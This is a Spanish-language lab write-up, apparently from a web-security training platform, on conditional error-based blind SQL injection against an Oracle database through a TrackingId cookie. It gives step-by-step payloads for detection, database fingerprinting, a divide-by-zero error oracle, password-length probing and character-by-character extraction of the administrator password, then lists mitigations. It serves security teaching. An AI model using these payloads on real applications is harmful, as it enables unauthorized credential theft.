Lab 12

Conditional Error-based Blind SQL Injection

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: Conditional Error-based Blind SQL Injection

Objetivo

Explotar una vulnerabilidad SQL Injection ciega para enumerar la contraseña del usuario administrator.

La aplicación no devuelve resultados de la base de datos, pero sí genera errores del servidor cuando una consulta SQL produce una excepción.

Mediante errores condicionados es posible inferir información del sistema y reconstruir la contraseña carácter por carácter.

Vulnerabilidad

El servidor concatena directamente el valor de la cookie TrackingId dentro de una consulta SQL.

Aunque la aplicación no devuelve datos ni cambia el contenido de la página, sí devuelve un error HTTP 500 cuando ocurre un fallo en la base de datos.

Esto permite explotar la vulnerabilidad mediante preguntas condicionales que provocan errores deliberados.

Procedimiento

Paso 1 – Detectar SQL Injection

Se interceptó una solicitud HTTP en Burp Suite y se modificó la cookie: 

TrackingId=abc'

El servidor devolvió un error SQL, confirmando la vulnerabilidad.

Paso 2 – Identificar el DBMS

Se probó la consulta: 

TrackingId=abc'||(SELECT '' FROM dual)||'

La ausencia de error confirmó que la base de datos utilizada era Oracle.

Paso 3 – Probar condiciones booleanas mediante errores

TrackingId=abc'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Cuando la condición es verdadera, el servidor devuelve HTTP 500.

Paso 4 – Confirmar existencia del usuario administrator

TrackingId=abc'||(
SELECT CASE WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE '' END
FROM users WHERE username='administrator')||'

El error confirma que el usuario existe.

Paso 5 – Determinar longitud de la contraseña

TrackingId=abc'||(
SELECT CASE WHEN LENGTH(password)=20
THEN TO_CHAR(1/0)
ELSE '' END
FROM users WHERE username='administrator')||'

Se descubrió que la contraseña tiene 20 caracteres.

Paso 6 – Extraer la contraseña

Se utilizó Intruder para probar cada carácter de la contraseña: 

SUBSTR(password,1,1)

Repitiendo el proceso para cada posición se reconstruyó la contraseña completa: 

0xkkbi6793o8z2ep4map

Mitigación recomendada

  • Uso obligatorio de consultas parametrizadas.
  • No concatenar entradas del usuario en consultas SQL.
  • Ocultar errores de base de datos en producción.
  • Aplicar principio de mínimo privilegio en la base de datos.
  • Implementar monitoreo de ataques automatizados.
